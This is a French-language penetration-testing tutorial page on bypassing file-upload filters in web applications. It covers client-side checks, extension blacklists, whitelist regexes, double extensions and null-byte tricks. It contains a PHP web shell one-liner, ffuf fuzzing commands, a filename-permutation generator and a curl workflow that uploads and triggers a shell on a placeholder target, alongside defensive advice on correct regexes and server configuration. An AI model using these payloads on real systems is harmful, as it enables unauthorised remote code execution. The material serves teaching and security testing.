# Contournement de filtres d'upload

Les fonctionnalités d'upload intègrent souvent des filtres pour restreindre les types de fichiers acceptés. Certains filtres opèrent côté client (JavaScript), d'autres côté serveur (blacklist ou whitelist d'extensions). Cette page détaille les techniques pour contourner chacun de ces mécanismes et parvenir à uploader un script exécutable malgré les restrictions en place.

## Pourquoi

Un formulaire d'upload qui affiche "Only images allowed" peut donner l'impression que le téléversement de scripts est impossible. En réalité, la plupart de ces filtres reposent sur des vérifications superficielles ou incomplètes. Comprendre leurs faiblesses permet de démontrer qu'un contrôle d'extension seul ne suffit jamais à sécuriser une fonctionnalité d'upload. En pentest, contourner ces filtres est souvent l'étape qui transforme un formulaire anodin en vecteur de compromission complète.

## Comment ça marche

### Validation côté client (JavaScript)

Certaines applications ne valident le type de fichier que dans le navigateur, via du JavaScript exécuté au moment de la sélection du fichier. Le serveur ne refait aucune vérification. Puisque le code JavaScript s'exécute localement, on a un contrôle total sur son comportement.

Deux approches permettent de contourner cette validation :

{% tabs %}
{% tab title="Modification de la requête (Burp)" %}
On sélectionne un fichier image légitime pour satisfaire la validation JavaScript, puis on intercepte la requête HTTP avec Burp Suite avant qu'elle n'atteigne le serveur. Dans le corps de la requête multipart, on modifie :

- Le champ `filename` : remplacer `image.jpg` par `shell.php`
- Le contenu du fichier : remplacer les données de l'image par le code du web shell

```http
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
```

Le serveur reçoit un fichier PHP alors que le JavaScript n'a vu qu'une image.
{% endtab %}

{% tab title="Manipulation du DOM" %}
On désactive directement la validation dans le navigateur via les outils développeur (`Ctrl+Shift+C` sur Firefox).

1. Inspecter le champ `<input type="file">` pour repérer la fonction de validation (par exemple `onchange="checkFile(this)"`)
2. Supprimer l'attribut `onchange` en double-cliquant dessus dans l'inspecteur
3. Optionnellement, retirer l'attribut `accept=".jpg,.jpeg,.png"` pour que le sélecteur de fichiers affiche tous les types

```html
<!-- - Avant -->
<input type="file" name="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">

<!-- - Après modification -->
<input type="file" name="uploadFile">
```

Ces modifications sont temporaires (elles disparaissent au rafraîchissement de la page), mais suffisent pour uploader le fichier voulu.
{% endtab %}
{% endtabs %}

{% hint style="info" %}
Toute validation qui s'exécute uniquement dans le navigateur est par définition contournable. Un attaquant peut interagir directement avec le serveur via cURL ou Burp, sans jamais passer par le front-end.
{% endhint %}

---

### Filtres par liste noire (blacklist)

Quand le back-end implémente sa propre validation, la forme la plus courante est la blacklist : une liste d'extensions interdites. Si l'extension du fichier uploadé apparaît dans cette liste, le serveur rejette le fichier.

Voici un exemple typique de blacklist PHP :

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "Extension not allowed";
    die();
}
```

Le problème fondamental de cette approche : la liste ne sera jamais exhaustive. PHP reconnaît de nombreuses extensions alternatives capables d'exécuter du code, et la configuration du serveur web peut en autoriser encore davantage.

**Extensions PHP alternatives courantes :**

| Extension | Exécution PHP | Notes |
|---|---|---|
| `.phtml` | Oui | Souvent autorisée par défaut sur Apache |
| `.phar` | Oui | Archive PHP exécutable |
| `.php5` | Oui | Versions spécifiques de PHP |
| `.php7` | Oui | Souvent oubliée dans les blacklists |
| `.phps` | Parfois | Affiche le code source sur certains serveurs |
| `.pht` | Oui | Extension moins connue |
| `.pgif` | Parfois | Dépend de la configuration serveur |
| `.shtml` | Oui (SSI) | Server-Side Includes |
| `.pHp` | Oui (Windows) | La comparaison est sensible à la casse en PHP, mais Windows ignore la casse des noms de fichiers |

**Fuzzing des extensions**

Pour identifier les extensions autorisées, on fuzze le formulaire d'upload avec une wordlist d'extensions PHP. On intercepte une requête d'upload légitime avec Burp, on l'envoie dans Intruder, et on place le marqueur de position sur l'extension du fichier.

```bash
# - Wordlist d'extensions PHP (PayloadsAllTheThings)
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

# - Exemple de fuzzing avec ffuf
ffuf -w php-extensions.txt:FUZZ \
     -u 'http://<IP_CIBLE>:<PORT>/upload.php' \
     -X POST \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
     -d '------WebKitFormBoundary\r\nContent-Disposition: form-data; name="uploadFile"; filename="shell.FUZZ"\r\n\r\n<?php system($_REQUEST["cmd"]); ?>\r\n------WebKitFormBoundary--' \
     -fr "Extension not allowed"
```

{% hint style="success" %}
En triant les résultats par taille de réponse dans Burp Intruder, on distingue rapidement les extensions rejetées (message d'erreur, taille constante) des extensions acceptées (message de succès, taille différente).
{% endhint %}

---

### Filtres par liste blanche (whitelist)

La whitelist est plus restrictive que la blacklist : seules les extensions explicitement autorisées sont acceptées. Cependant, son efficacité dépend entièrement de la qualité de la regex utilisée pour la validation.

**Regex vulnérable vs regex sécurisée :**

{% tabs %}
{% tab title="Regex vulnérable" %}
```php
// - Vérifie si le nom CONTIENT une extension autorisée
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

Cette regex n'a pas d'ancre de fin (`$`). Elle valide tout nom de fichier qui contient `.jpg` quelque part, même s'il se termine par autre chose.
{% endtab %}

{% tab title="Regex sécurisée" %}
```php
// - Vérifie si le nom SE TERMINE par une extension autorisée
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

L'ancre `$` impose que l'extension autorisée soit la dernière partie du nom de fichier.
{% endtab %}
{% endtabs %}

#### Double extension

Contre une regex sans ancre de fin, on exploite la double extension. Le fichier `shell.jpg.php` contient `.jpg` dans son nom (ce qui satisfait la regex) mais se termine par `.php` (ce que le serveur web exécutera).

```
shell.jpg.php     -> contient .jpg -> passe la whitelist
                  -> se termine par .php -> exécuté comme PHP
```

#### Reverse double extension

Contre une regex avec ancre de fin, on inverse la logique. Le fichier `shell.php.jpg` se termine bien par `.jpg` (passe la whitelist sécurisée), mais si la configuration Apache associe le handler PHP à tout fichier contenant `.php` dans son nom, le code sera quand même exécuté.

```xml
<!-- - Configuration Apache vulnérable dans php7.4.conf -->
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

Cette directive utilise elle aussi une regex sans ancre de fin. Tout fichier dont le nom contient `.php`, `.phar` ou `.phtml` sera traité comme du PHP, peu importe l'extension finale.

```
shell.php.jpg     -> se termine par .jpg -> passe la whitelist
                  -> contient .php -> Apache exécute comme PHP
```

{% hint style="warning" %}
La reverse double extension ne fonctionne que si la configuration du serveur web contient une directive vulnérable. C'est une erreur de configuration, pas un défaut de l'application elle-même.
{% endhint %}

#### Injection de caractères

On peut injecter des caractères spéciaux avant ou après l'extension pour tromper le serveur dans son interprétation du nom de fichier.

| Caractère | Exemple | Effet |
|---|---|---|
| `%00` (null byte) | `shell.php%00.jpg` | PHP <= 5.x tronque au null byte, stocke `shell.php` |
| `:` (colon) | `shell.aspx:.jpg` | Windows tronque au colon, stocke `shell.aspx` |
| `%20` (espace) | `shell.php%20.jpg` | Peut tromper certains parsers d'extension |
| `%0a` (newline) | `shell.php%0a.jpg` | Peut provoquer une troncature sur certains serveurs |
| `.` (point) | `shell.php.` | Windows supprime le point final |
| `.\` | `shell.php.\` | Peut causer une interprétation différente du chemin |

**Génération automatique de permutations :**

Pour tester systématiquement ces variantes, on génère une wordlist combinant tous les caractères avec les extensions PHP et image :

```bash
# - Génération de toutes les permutations fichier/caractère/extension
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '...' ':'; do
    for ext in '.php' '.phps' '.pht' '.phtml'; do
        echo "shell${char}${ext}.jpg" >> wordlist.txt
        echo "shell${ext}${char}.jpg" >> wordlist.txt
        echo "shell.jpg${char}${ext}" >> wordlist.txt
        echo "shell.jpg${ext}${char}" >> wordlist.txt
    done
done
```

On utilise ensuite cette wordlist avec Burp Intruder pour fuzzer le champ filename et identifier les combinaisons qui passent la validation tout en permettant l'exécution du code.

{% hint style="danger" %}
Le null byte (`%00`) ne fonctionne que sur PHP 5.x et versions antérieures. Sur les versions modernes de PHP, cette technique est corrigée. Elle reste pertinente sur des systèmes legacy, encore fréquents dans certains environnements.
{% endhint %}

## En pratique

### Workflow de contournement depuis Exegol

```bash
# 1 - Identifier le framework (tester les extensions courantes)
curl -s -o /dev/null -w "%{http_code}" "http://<IP_CIBLE>:<PORT>/index.php"
curl -s -o /dev/null -w "%{http_code}" "http://<IP_CIBLE>:<PORT>/index.asp"
curl -s -o /dev/null -w "%{http_code}" "http://<IP_CIBLE>:<PORT>/index.aspx"

# 2 - Tester un upload direct (sans filtre)
curl -s -F "uploadFile=@shell.php" "http://<IP_CIBLE>:<PORT>/upload.php"

# 3 - Si rejeté, fuzzer les extensions autorisées
ffuf -w /opt/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \
     -u "http://<IP_CIBLE>:<PORT>/upload.php" \
     -X POST -F "uploadFile=@shell.FUZZ" \
     -fr "not allowed"

# 4 - Tester les doubles extensions
curl -s -F "uploadFile=@shell.jpg.php;filename=shell.jpg.php" \
     "http://<IP_CIBLE>:<PORT>/upload.php"

# 5 - Tester la reverse double extension
curl -s -F "uploadFile=@shell.php.jpg;filename=shell.php.jpg" \
     "http://<IP_CIBLE>:<PORT>/upload.php"

# 6 - Accéder au shell uploadé
curl -s "http://<IP_CIBLE>:<PORT>/profile_images/shell.php.jpg?cmd=id"
```

### Vérification rapide de la validation

Pour déterminer si la validation est côté client ou côté serveur, observer le comportement lors de la sélection du fichier :

- **Pas de requête HTTP envoyée + message d'erreur immédiat** : validation JavaScript (côté client)
- **Requête HTTP envoyée + réponse du serveur avec erreur** : validation côté serveur

L'onglet Network des outils développeur permet de trancher instantanément.

## Pièges et galères

{% tabs %}
{% tab title="Côté client" %}
- **Plusieurs validations empilées** : certaines applications combinent validation JavaScript, attribut `accept` sur l'input, et vérification back-end. Contourner le JavaScript ne suffit pas toujours.
- **Requête non standard** : si l'application utilise un upload via AJAX avec des headers personnalisés ou un format JSON, la modification dans Burp demande plus d'attention pour reproduire exactement le format attendu.
{% endtab %}
{% tab title="Blacklist" %}
- **Extensions non exécutables** : certaines extensions passent la blacklist mais ne sont pas configurées pour exécuter du PHP sur le serveur cible. Toujours vérifier que le code est bien interprété après l'upload.
- **Comparaison insensible à la casse** : si le back-end convertit l'extension en minuscules avant la comparaison (`strtolower()`), les variantes comme `.pHp` ne fonctionneront pas.
{% endtab %}
{% tab title="Whitelist" %}
- **Regex bien écrite** : une whitelist avec une regex correcte (ancre `$`, échappement du point, flags appropriés) bloque les doubles extensions classiques.
- **Pas de misconfiguration Apache** : la reverse double extension nécessite que la directive `FilesMatch` du serveur soit elle-même vulnérable. Sur un serveur bien configuré, `shell.php.jpg` ne sera jamais exécuté comme PHP.
- **Caractères filtrés** : certains serveurs rejettent les noms de fichiers contenant des caractères spéciaux (`%00`, `:`, etc.) avant même d'atteindre la logique de validation d'extension.
{% endtab %}
{% endtabs %}

## Retour terrain

En conditions réelles, les validations purement côté client se rencontrent encore régulièrement, surtout sur des applications développées rapidement ou par des équipes avec peu d'expérience en sécurité. C'est le premier test à effectuer et le plus rapide à valider.

Les blacklists côté serveur sont plus fréquentes que les whitelists, et presque toujours incomplètes. L'extension `.phtml` passe sous le radar dans une grande majorité des cas. Sur les serveurs Windows, les variantes de casse (`.pHp`, `.PhP`) sont un vecteur fiable à ne pas négliger.

Les attaques par double extension et injection de caractères sont plus situationnelles. Elles fonctionnent quand la regex de validation est mal écrite ou quand la configuration du serveur web contient des directives permissives. Avant de fuzzer aveuglément, il est souvent plus efficace de lire la configuration Apache ou Nginx si une LFI est déjà disponible, car elle révèle exactement quelles extensions le serveur exécutera.

## Mémo express

| Technique | Cible | Condition |
|---|---|---|
| Modification requête Burp | Validation JS côté client | Aucune validation back-end |
| Manipulation DOM | Validation JS côté client | Aucune validation back-end |
| Extension alternative (.phtml, .phar) | Blacklist back-end | Extension absente de la liste |
| Casse mixte (.pHp) | Blacklist sensible à la casse | Serveur Windows |
| Double extension (shell.jpg.php) | Whitelist regex sans `$` | Regex vérifie `contient` et non `se termine par` |
| Reverse double extension (shell.php.jpg) | Whitelist regex avec `$` | Config serveur (FilesMatch) vulnérable |
| Null byte (shell.php%00.jpg) | Whitelist | PHP <= 5.x uniquement |
| Colon (shell.aspx:.jpg) | Whitelist | Serveur Windows |
| Fuzzing permutations | Toute whitelist | Serveur ancien ou mal configuré |

***
